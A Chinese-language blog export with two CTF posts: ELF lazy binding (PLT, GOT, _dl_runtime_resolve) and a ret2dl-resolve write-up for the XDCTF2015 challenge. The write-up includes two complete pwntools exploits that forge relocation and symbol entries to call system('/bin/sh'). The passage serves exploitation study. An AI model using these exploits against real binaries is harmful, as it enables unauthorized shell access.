用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针 .rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym .dynstr + sym-&gt;st_name得出符号名字符串指针 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表 调用这个函数 _dl_runtime_resolve在第二步时 .rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel 这个时候，_dl_runtime_resolve并没有检查.rel.plt + 第二个参数后是否造成越界访问，所以我们能给一个很大的.rel.plt的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说.bss 然后第三步 rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym 所以在我们所伪造的Elf32_Rel，需要放一个r_info字段，大概长这样就行0xXXXXXX07，其中XXXXXX是相对.dynsym表的下标，注意不是偏移，所以是偏移除以Elf32_Sym的大小，即除以0x10（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个Elf32_Sym。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好 然后第四步 .dynstr + sym-&gt;st_ame得出符号名字符串指针 我们可以控制index_offset所以指向这个fake_stack上的一个位置即为我们布置的fake_reloc 需要通过计算得到index_offset 的值， 计算公式为：我们布置的fake_reloc 的地址 - rel.plt 的真实地址 fake_reloc的结构，r_offset是函数 的 .got.plt 的地址 12345typedef struct&#123; Elf32_Addr r_offset; Elf32_Word r_info;&#125; Elf32_Rel; 让我们要做的是让fake_reloc 的r_info 指向 fake_sym 结构体 计算方法为 1234align = 0x10-(( fake_sym_addr - .dynsym ) &amp;7 );fake_sym_addr = fake_sym_addr + align ;index_dynsym = (fake_sym_addr - .dynsym )/0x10;r_info = (index_dysym&lt;&lt;8) | 0x7 //保证这最后一字节为 0x07 劫持程序到fake_sym之后我们要做的就是让fake_sym指向我们定义的 .dynstr 中的对应函数字符串。一般fake_sym我们构造的结构为fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12) ，st_name就是我们保存我字符串的地址 1st_name = (fake_sym_addr + 0x10) - dynstr //0x10 刚好为fake_sym的大小刚好让 函数字符串 保存在这个位置。 让这个字符串为我们需要的如：system 那我们之后就能调用write从而调用system 最终的Exploit 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *p = process('./bof')elf = ELF('./bof')read_plt = elf.plt['read']write_plt = elf.plt['write']write_got = elf.got['write']offset = 112ppp_ret = 0x08048619 #pop esi ; pop edi ; pop ebp ; retpop_ebp_ret = 0x0804861b #pop ebp ; retleave_ret = 0x08048458 #leave ; retbss_addr = 0x0804a040 # readelf -S pwn1 | grep \".bss\"stack_size = 0x800base_stage = bss_addr + stack_sizeplt_0 = 0x08048380 #readelf -Srel_plt = 0x08048330dynsym = 0x080481d8dynstr = 0x08048278p.recvuntil('Welcome to XDCTF2015~!\\n')payload = 'A' * offsetpayload += p32(read_plt)payload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret)payload += p32(base_stage)payload += p32(leave_ret)p.sendline(payload)index_offset = (base_stage + 28) - rel_pltfake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)fake_dynstr = (fake_sym_addr + 0x10) - dynstrfake_sym = p32(fake_dynstr) + p32(0) + p32(0) + p32(0x12)payload2 = 'AAAA'payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += 'AAAA'payload2 += p32(base_stage + 80)payload2 += 'aaaa'payload2 += 'aaaa'payload2 += fake_relocpayload2 += 'B' * alignpayload2 += fake_sympayload2 += \"system\\x00\"payload2 += 'A' * (80 - len(payload2))payload2 += '/bin/sh\\x00'payload2 += 'A' * (100 - len(payload2))p.sendline(payload2)p.interactive() 还有一种使用ROP模块写的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwn import *elf = ELF('main')r = process('./main')rop = ROP('./main')offset = 112bss_addr = elf.bss()r.recvuntil('Welcome to XDCTF2015~!\\n')## stack pivoting to bss segment## new stack size is 0x800stack_size = 0x800base_stage = bss_addr + stack_size### paddingrop.raw('a' * offset)### read 100 byte to base_stagerop.read(0, base_stage, 100)### stack pivoting, set esp = base_stagerop.migrate(base_stage)r.sendline(rop.chain())## write sh=\"/bin/sh\"rop = ROP('./main')sh = \"/bin/sh\"plt0 = elf.get_section_by_name('.plt').header.sh_addrrel_plt = elf.get_section_by_name('.rel.plt').header.sh_addrdynsym = elf.get_section_by_name('.dynsym').header.sh_addrdynstr = elf.get_section_by_name('.dynstr').header.sh_addr### making fake write symbolfake_sym_addr = base_stage + 32align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf ) # since the size of item(Elf32_Symbol) of dynsym is 0x10fake_sym_addr = fake_sym_addr + alignindex_dynsym = ( fake_sym_addr - dynsym) / 0x10 # calculate the dynsym index of write## plus 10 since the size of Elf32_Sym is 16.st_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x12])### making fake write relocation## making base_stage+24 ---&gt; fake relocindex_offset = base_stage + 24 - rel_pltwrite_got = elf.got['write']r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([write_got, r_info])rop.raw(plt0)rop.raw(index_offset)## fake ret addr of writerop.raw('bbbb')rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))rop.raw(fake_write_reloc) # fake write relocrop.raw('a' * align) # paddingrop.raw(fake_write_sym) # fake write symbolrop.raw('write\\x00') # there must be a \\x00 to mark the end of stringrop.raw('a' * (80 - len(rop.chain())))rop.raw(sh)rop.raw('a' * (100 - len(rop.chain())))r.sendline(rop.chain())r.interactive()","categories":[],"tags":[]},{"title":"延迟绑定小谈","slug":"╤╙│┘░≤╢¿╨í╠╕","date":"2019-10-14T15:51:48.000Z","updated":"2019-10-15T06:52:18.000Z","comments":true,"path":"2019/10/14/╤╙│┘░≤╢¿╨í╠╕/","link":"","permalink":"http://yoursite.com/2019/10/14/╤╙│┘░≤╢¿╨í╠╕/","excerpt":"","text":"动态链接因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程 123456#include &lt;stdio.h&gt;int main()&#123; puts(\"Hello Pwn\\n\"); return 0;&#125; 其中，这个puts是调用的libc这个动态链接库导出的一个函数。编译它，看看puts是怎么被调用的 12345678.plt:080482E0 ; int puts(const char *s).plt:080482E0 _puts proc near ; CODE XREF: main+19↓p.plt:080482E0.plt:080482E0 s = dword ptr 4.plt:080482E0.plt:080482E0 jmp ds:off_804A00Cc.plt:080482E0 _puts endp.plt:080482E0 puts会call到off_804A00Cc这里，这里就是“jmp [GOT表地址]”的这样一条指令， 跟一下，看看这个off_804A00C在第一次调用时是什么东西 12345678910111213141516171819202122232425262728293031323334353637383940414243Breakpoint *0x08048424pwndbg&gt; si0x080482e0 in puts@plt ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA─────────────────────────────────[ REGISTERS ]────────────────────────────────── EAX 0xf7fb4dbc (environ) —▸ 0xffffd10c —▸ 0xffffd2ff ◂— 'XDG_VTNR=7' EBX 0x0 ECX 0xffffd070 ◂— 0x1 EDX 0xffffd094 ◂— 0x0 EDI 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 ESI 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 EBP 0xffffd058 ◂— 0x0 ESP 0xffffd03c —▸ 0x8048429 ◂— add esp, 0x10 EIP 0x80482e0 (puts@plt) ◂— jmp dword ptr [0x804a00c]───────────────────────────────────[ DISASM ]─────────────────────────────────── ► 0x80482e0 &lt;puts@plt&gt; jmp dword ptr [0x804a00c] 0x80482e6 &lt;puts@plt+6&gt; push 0 0x80482eb &lt;puts@plt+11&gt; jmp 0x80482d0 ↓ 0x80482d0 push dword ptr [0x804a004] 0x80482d6 jmp dword ptr [0x804a008] &lt;0xf7fee000&gt; ↓ 0xf7fee000 &lt;_dl_runtime_resolve&gt; push eax 0xf7fee001 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fee002 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fee003 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fee007 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fee00b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe77e0&gt;───────────────────────────────────[ STACK ]────────────────────────────────────00:0000│ esp 0xffffd03c —▸ 0x8048429 ◂— add esp, 0x1001:0004│ 0xffffd040 —▸ 0x80484c0 ◂— dec eax /* 'Hello Pwn\\n' */02:0008│ 0xffffd044 —▸ 0xffffd104 —▸ 0xffffd2de ◂— '/home/syc/Downloads/retdll/a.out'03:000c│ 0xffffd048 —▸ 0xffffd10c —▸ 0xffffd2ff ◂— 'XDG_VTNR=7'04:0010│ 0xffffd04c —▸ 0x8048461 ◂— lea eax, [ebx - 0xf8]05:0014│ 0xffffd050 —▸ 0xf7fb33dc (__exit_funcs) —▸ 0xf7fb41e0 (initial) ◂— 0x006:0018│ 0xffffd054 —▸ 0xffffd070 ◂— 0x107:001c│ ebp 0xffffd058 ◂— 0x0─────────────────────────────────[ BACKTRACE ]────────────────────────────────── ► f 0 80482e0 puts@plt f 1 8048429 f 2 f7e19637 __libc_start_main+247──────────────────────────────────────────────────────────────────────────────── 可以发现，是0x80482e6这个地址，并不直接是libc的puts函数的地址。这是因为linux在程序加载时使用了延迟绑定(lazyload)，只有等到这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会再push一个0，再push一个dword ptr [0x804a004]，最后跳到libc的_dl_runtime_resolve（call _dl_fixup）去执行。这个函数的目的，是根据2个参数获取到导出函数（这里是puts）的地址，然后放到相应的GOT表，并且调用它。而这个函数的地址也是从GOT表取并且jmp [xxx]过去的，但是这个函数不会延迟绑定，因为所有函数都是用它做的延迟绑定 了解一下elf各段之间的关系 ，才能更好的理解前面从PLT到GOT的过程 12345678910111213141516171819202122232425262728293031323334syc@ubuntu:~/Downloads/retdll$ readelf -S a.outThere are 29 section headers, starting at offset 0x114c:Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 08048154 000154 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 08048168 000168 000020 00 A 0 0 4 [ 3] .note.gnu.build-i NOTE 08048188 000188 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 080481ac 0001ac 000020 04 A 5 0 4 [ 5] .dynsym DYNSYM 080481cc 0001cc 000050 10 A 6 1 4 [ 6] .dynstr STRTAB 0804821c 00021c 00004a 00 A 0 0 1 [ 7] .gnu.version VERSYM 08048266 000266 00000a 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 08048270 000270 000020 00 A 6 1 4 [ 9] .rel.dyn REL 08048290 000290 000008 08 A 5 0 4 [10] .rel.plt REL 08048298 000298 000010 08 AI 5 24 4 [11] .init PROGBITS 080482a8 0002a8 000023 00 AX 0 0 4 [12] .plt PROGBITS 080482d0 0002d0 000030 04 AX 0 0 16 [13] .plt.got PROGBITS 08048300 000300 000008 00 AX 0 0 8 [14] .text PROGBITS 08048310 000310 000192 00 AX 0 0 16 [15] .fini PROGBITS 080484a4 0004a4 000014 00 AX 0 0 4 [16] .rodata PROGBITS 080484b8 0004b8 000013 00 A 0 0 4 [17] .eh_frame_hdr PROGBITS 080484cc 0004cc 00002c 00 A 0 0 4 [18] .eh_frame PROGBITS 080484f8 0004f8 0000cc 00 A 0 0 4 [19] .init_array INIT_ARRAY 08049f08 000f08 000004 00 WA 0 0 4 [20] .fini_array FINI_ARRAY 08049f0c 000f0c 000004 00 WA 0 0 4 [21] .jcr PROGBITS 08049f10 000f10 000004 00 WA 0 0 4 [22] .dynamic DYNAMIC 08049f14 000f14 0000e8 08 WA 6 0 4 [23] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4 [24] .got.plt PROGBITS 0804a000 001000 000014 04 WA 0 0 4 [25] .data PROGBITS 0804a014 001014 000008 00 WA 0 0 4 [26] .bss NOBITS 0804a01c 00101c 000004 00 WA 0 0 1 [27] .comment PROGBITS 00000000 00101c 000035 01 MS 0 0 1 [28] .shstrtab STRTAB 00000000 001051 0000fa 00 0 0 1 我们一般只关注几个比较重要的 section .dynsym 动态链接符号表 .dynstr 动态链接的字符串 .rel.dyn 变量重定位 .rel.plt 函数重定位 .got 全局变量偏移表 .got.plt 全局函数偏移表 .dynamic包含了一些关于动态链接的关键信息，在里这它长这样，事实上这个section所有程序都差不多 12345678910111213141516171819202122232425262728syc@ubuntu:~/Downloads/retdll$ readelf -d a.outDynamic section at offset 0xf14 contains 24 entries: Tag Type Name/Value 0x00000001 (NEEDED) Shared library: [libc.so.6] 0x0000000c (INIT) 0x80482a8 0x0000000d (FINI) 0x80484a4 0x00000019 (INIT_ARRAY) 0x8049f08 0x0000001b (INIT_ARRAYSZ) 4 (bytes) 0x0000001a (FINI_ARRAY) 0x8049f0c 0x0000001c (FINI_ARRAYSZ) 4 (bytes) 0x6ffffef5 (GNU_HASH) 0x80481ac 0x00000005 (STRTAB) 0x804821c 0x00000006 (SYMTAB) 0x80481cc 0x0000000a (STRSZ) 74 (bytes) 0x0000000b (SYMENT) 16 (bytes) 0x00000015 (DEBUG) 0x0 0x00000003 (PLTGOT) 0x804a000 0x00000002 (PLTRELSZ) 16 (bytes) 0x00000014 (PLTREL) REL 0x00000017 (JMPREL) 0x8048298 0x00000011 (REL) 0x8048290 0x00000012 (RELSZ) 8 (bytes) 0x00000013 (RELENT) 8 (bytes) 0x6ffffffe (VERNEED) 0x8048270 0x6fffffff (VERNEEDNUM) 1 0x6ffffff0 (VERSYM) 0x8048266 0x00000000 (NULL) 0x0 然后.dynamic每个元素的结构体是这样的， 一个 Elf_Dyn 是一个键值对，其中 d_tag 是键，d_value 是值 1234567typedef struct &#123; Elf32_Sword d_tag; union &#123; Elf32_Word d_val; Elf32_Addr d_ptr; &#125; d_un;&#125; Elf32_Dyn; 这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针 DT_JMPREL(.rel.plt) 可以看到puts符号位于.rel.plt的第一个，也就是偏移为0×0的地方，这里的r_offset（偏移量）就是.got.plt的地址 12345678910syc@ubuntu:~/Downloads/retdll$ readelf -r a.outRelocation section '.rel.dyn' at offset 0x290 contains 1 entries: Offset Info Type Sym.Value Sym. Name08049ffc 00000206 R_386_GLOB_DAT 00000000 __gmon_start__Relocation section '.rel.plt' at offset 0x298 contains 2 entries: Offset Info Type Sym.Value Sym. Name0804a00c 00000107 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.00804a010 00000307 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下： 12345678typedef struct&#123; Elf32_Addr r_offset; //指向GOT表的指针 Elf32_Word r_info; //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07 //1和3是这个导入函数的符号在.dynsym中的下标， //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应&#125; Elf32_Rel; DT_STRTAB(.dynstr)1234567LOAD:0804821C ; ELF String TableLOAD:0804821C byte_804821C db 0 ; DATA XREF: LOAD:080481DC↑oLOAD:0804821C ; LOAD:080481EC↑o ...LOAD:0804821D aLibcSo6 db 'libc.so.6',0LOAD:08048227 aIoStdinUsed db '_IO_stdin_used',0 ; DATA XREF: LOAD:0804820C↑oLOAD:08048236 aPuts db 'puts',0 ; DATA XREF: LOAD:080481DC↑oLOAD:0804823B aLibcStartMain db '__libc_start_main',0 一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对0x804821C的偏移 DT_SYMTAB(.dynsym)123456789syc@ubuntu:~/Downloads/retdll$ readelf -s a.outSymbol table '.dynsym' contains 5 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 00000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.0 (2) 2: 00000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 3: 00000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.0 (2) 4: 080484bc 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used 这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下 123456789101112typedef struct&#123; Elf32_Word st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了 Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; //对于导入函数符号而言，它是0x12 unsigned char st_other; Elf32_Section st_shndx;&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0#define ELF32_R_SYM(info) ((info)&gt;&gt;8)#define ELF32_R_TYPE(info) ((unsigned char)(info))#define ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type)) 解析符号 假设.dynsym的地址为080481cc，又因为puts函数对应的num为1 ，则程序会去0x080481cc+0x10*1寻找st_name即puts字符串在.dynstr中的偏移 12gef➤ x/4wx 0x080481cc+0x10*10x80481dc: 0x0000001a 0x00000000 0x00000000 0x00000012 解释一下这一串地址0x080481cc+0x10*1的意义 0x080481cc 对应.dynsym的地址 0×10 ： 每一条symbol信息的大小在SYMENT中体现，为16 bytes （可以用readelf -d fun命令查看） 1 ： num值为1 可以看到0x080481dc对应的第一个值为0x1a， 再利用如下命令即可找到puts符号 12gef➤ x/s 0x0804821c+0x1a0x8048236: &quot;puts&quot; 0x0804821c+0x1a 解析 0x0804821c 对应于.dynstr的地址 0x1a 对应刚才得到的偏移 函数执行流程分析用gdb运行这个程序，并在puts函数处下断点 1234► 0x80482e0 &lt;puts@plt&gt; jmp dword ptr [0x804a00c] 0x80482e6 &lt;puts@plt+6&gt; push 0 0x80482eb &lt;puts@plt+11&gt; jmp 0x80482d0 执行到我们下的断点处发现，会跳转到0x804a00c这个地址 12pwndbg&gt; x/wx 0x804a00c0x804a00c: 0x080482e6 0x0804a00c这个地址处存储的内容为&lt;puts@plt+6&gt;的地址，因为这个程序第一次运行所以got表中没有保存read函数的地址，所以程序又跳转会&lt;puts@plt+6&gt;，所以紧接着会执行 120x80482e6 &lt;puts@plt+6&gt; push 00x80482eb &lt;puts@plt+11&gt; jmp 0x80482d0 先将0×0压栈（0×0 表示相对.rel.plt的偏移，通过上面分析我们可以知道，read符号在.rel.plt中的位置为第一个，所以偏移为0），又跳转到0x80482d0，看一下该地处的内容 123pwndbg&gt; x/2i 0x080482d0 0x80482d0: push DWORD PTR ds:0x804a004 0x80482d6: jmp DWORD PTR ds:0x804a008 会将0x804a004压栈，然后跳转到0x804a008处。 0x804a004处对应一个指向内部数据结构的指针，类型是 link_map，在动态装载器内部使用，包含了进行符号解析需要的当前 ELF 对象的信息。在它的 l_info 域中保存了 .dynamic 段中大多数条目的指针构成的一个数组，我们后面会利用它。 link_map的指针，这个结构是干什么的，我们不关心，但是有一点要知道，它包含了.dynamic的指针，通过这个link_map，_dl_runtime_resolve函数可以访问到.dynamic这个section 0x0804a008 处为函数 dl_runtime_resolve(link_map,rel_offset) 12pwndbg&gt; x/4wx 0xf7fee0000xf7fee000 &lt;_dl_runtime_resolve&gt;: 0x8b525150 0x8b102454 0xe80c2444 0xffff97d0 0xe80c2444是.dynamic的指针，与前面图中一致 我们看一下dl_runtime_resolve()函数的实现 123456789101112131415161718192021pwndbg&gt; x/20i 0xf7fee000 0xf7fee000 &lt;_dl_runtime_resolve&gt;: push eax 0xf7fee001 &lt;_dl_runtime_resolve+1&gt;: push ecx 0xf7fee002 &lt;_dl_runtime_resolve+2&gt;: push edx 0xf7fee003 &lt;_dl_runtime_resolve+3&gt;: mov edx,DWORD PTR [esp+0x10] 0xf7fee007 &lt;_dl_runtime_resolve+7&gt;: mov eax,DWORD PTR [esp+0xc] 0xf7fee00b &lt;_dl_runtime_resolve+11&gt;: call 0xf7fe77e0 &lt;_dl_fixup&gt; 0xf7fee010 &lt;_dl_runtime_resolve+16&gt;: pop edx 0xf7fee011 &lt;_dl_runtime_resolve+17&gt;: mov ecx,DWORD PTR [esp] 0xf7fee014 &lt;_dl_runtime_resolve+20&gt;: mov DWORD PTR [esp],eax 0xf7fee017 &lt;_dl_runtime_resolve+23&gt;: mov eax,DWORD PTR [esp+0x4] 0xf7fee01b &lt;_dl_runtime_resolve+27&gt;: ret 0xc 0xf7fee01e: xchg ax,ax 0xf7fee020 &lt;_dl_runtime_profile&gt;: push esp 0xf7fee021 &lt;_dl_runtime_profile+1&gt;: add DWORD PTR [esp],0x8 0xf7fee025 &lt;_dl_runtime_profile+5&gt;: push ebp 0xf7fee026 &lt;_dl_runtime_profile+6&gt;: push eax 0xf7fee027 &lt;_dl_runtime_profile+7&gt;: push ecx 0xf7fee028 &lt;_dl_runtime_profile+8&gt;: push edx 0xf7fee029 &lt;_dl_runtime_profile+9&gt;: mov ecx,esp 0xf7fee02b &lt;_dl_runtime_profile+11&gt;: sub esp,0x8 在0xf7fee00b地址处调用了 _dl_fixup()函数，并且采用寄存器传参，dl_fixup()是在dl-runtime.c中实现的， _dl_fixup函数传入的两个参数一个是rdi寄存器中存储的link_map，rsi是GOT表中关于PLT重定位的索引值，后面要根据该索引值写入新的地址 123456789_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)｛ const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL); value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0); return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);｝ 逐行解释 1_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg) 这里面 link_map还是一开始传进来的link_map,但一开始传进来的rel_offset改为用reloc_arg表示：reloc_arg=reloffset 1const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); 用来计算重定位入口reloc，JMPREL即.rel.plt地址，reloc_offset即reloc_arg 1const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; 找到在.dynsym中对应的条目，[ELFW(R_SYM) (reloc-&gt;r_info)]就是为了找到对应的num[?] 1assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); 检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7 1result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL); 根据st_name对应的偏移，去.dynstr(STRTAB)中查找对应的字符串，result为libc基地址(不知道是怎么找到result的，反正知道就好了。。。) 1value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0); value为函数的实际地址，在libc基地址的基础上加上函数在libc中的偏移 1return elf_machine_fixup_plt (l, result, reloc, rel_addr, value); 将函数地址写到got表对应位置 简单来说_dl_runtime_resolve就是会 用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针 .rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym .dynstr + sym-&gt;st_name得出符号名字符串指针 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表 调用这个函数 从一个ELF动态链接库文件中，根据已知的函数名称，找到相应的函数起始地址，那么过程是这样的，先从前面的ELF 的ehdr中找到文件的偏移e_phoff处，在这其中找到为PT_DYNAMIC 的d_tag的phdr，从这个地址开始处找到DT_DYNAMIC的节，最后从其中找到这样一个Elf32_Sym结构，它的st_name所指的字符串与给定的名称相符，就用st_value便是了 深入理解12345678 0xf7fee000 &lt;_dl_runtime_resolve&gt; push eax 0xf7fee001 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fee002 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fee003 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fee007 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc]► 0xf7fee00b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe77e0&gt; arg[0]: 0xffffd094 ◂— 0x0 arg[1]: 0xffffd070 ◂— 0x1 调用函数过程中已经压入了两个参数：第一个是动态链接库的struct link_map* 指针，另一个是rel的索引值， 这里是给下面的fixup函数以寄存器传递参数 真正的解析在do_lookup中实现了，我这里还是它的实现伪代码: 123456789101112131415161718192021222324Elf32_Addr do_lookup(struct link_map* lmap,char* symname)&#123; struct link_map* search_lmap=NULL; Elf32_Sym* symtab; Elf32_Sym* sym; char* strtab; char* find_name; int symindx; Elf32_Word hash=elf_hash_name(symname); for_each_search_lmap_in_search_list(lmap,search_lmap) &#123; symtab=search_lmap-&gt;l_info[DT_SYMTAB].d_un.d_ptr; strtab=search_lmap-&gt;l_info[DT_STRTAB].d_un.d_ptr; for (symindx=search_lmap-&gt;l_buckets[hash % search_lmap-&gt;l_nbuckets]; symindx!=0;symindx=search_lmap-&gt;l_chain[symindx]) &#123; sym=&amp;symtab[symindx]; find_name=strtab+sym-&gt;st_name; if (strcmp(find_name,symname)==0) return sym-&gt;st_value+search_lmap-&gt;l_addr; &#125; return 0; &#125;&#125; 流程图函数第一次被调用过程 第一步由函数调用跳入到PLT表中，然后第二步PLT表跳到GOT表中，可以看到第三步由GOT表回跳到PLT表中，这时候进行压栈，把代表函数的ID压栈，接着第四步跳转到公共的PLT表项中，第5步进入到GOT表中，然后_dl_runtime_resolve对动态函数进行地址解析和重定位，第七步把动态函数真实的地址写入到GOT表项中，然后执行函数并返回。 函数之后被调用过程 可以看到，第一步还是由函数调用跳入到PLT表，但是第二步跳入到GOT表中时，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回。 对于动态函数的调用，第一次要经过地址解析和回写到GOT表项中，第二次直接调用即可 ret2dl-resolve 利用主要是看 .dynamic能否可写 改写.dynamic的DT_STRTAB这个只有在checksec时No RELRO可行，即.dynamic可写。因为ret2dl-resolve会从.dynamic里面拿.dynstr字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个free函数，我们就把原本是free字符串的那个偏移位置设为system字符串，第一次调用free(&quot;bin/sh&quot;)（因为只有第一次才会resolve），就等于调用了system(&quot;/bin/sh&quot;) 操纵第二个参数，使其指向我们所构造的Elf32_Rel如果.dynamic不可写，那么以上方法就没用了，所以有第二种利用方法。要知道，前面的_dl_runtime_resolve在第二步时 12&gt; .rel.plt + 第二个参数`求出当前函数的重定位表项`Elf32_Rel`的指针，记作`rel&gt; 这个时候，_dl_runtime_resolve并没有检查.rel.plt + 第二个参数后是否造成越界访问，所以我们能给一个很大的.rel.plt的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说.bss。 然后第三步 12&gt; rel-&gt;r_info &gt;&gt; 8`作为`.dynsym`的下标，求出当前函数的符号表项`Elf32_Sym`的指针，记作`sym&gt; 所以在我们所伪造的Elf32_Rel，需要放一个r_info字段，大概长这样就行0xXXXXXX07，其中XXXXXX是相对.dynsym表的下标，注意不是偏移，所以是偏移除以Elf32_Sym的大小，即除以0x10（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个Elf32_Sym。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。 然后第四步 .dynstr + sym-&gt;st_name得出符号名字符串指针 同样类似，没有进行越界访问检查，所以这个字符串也能够伪造。 所以，最终的利用思路，大概是 120x80482d0 push dword ptr [0x804a004]0x80482d6 jmp dword ptr [0x804a008] 构造ROP，跳转到resolve的PLT，push 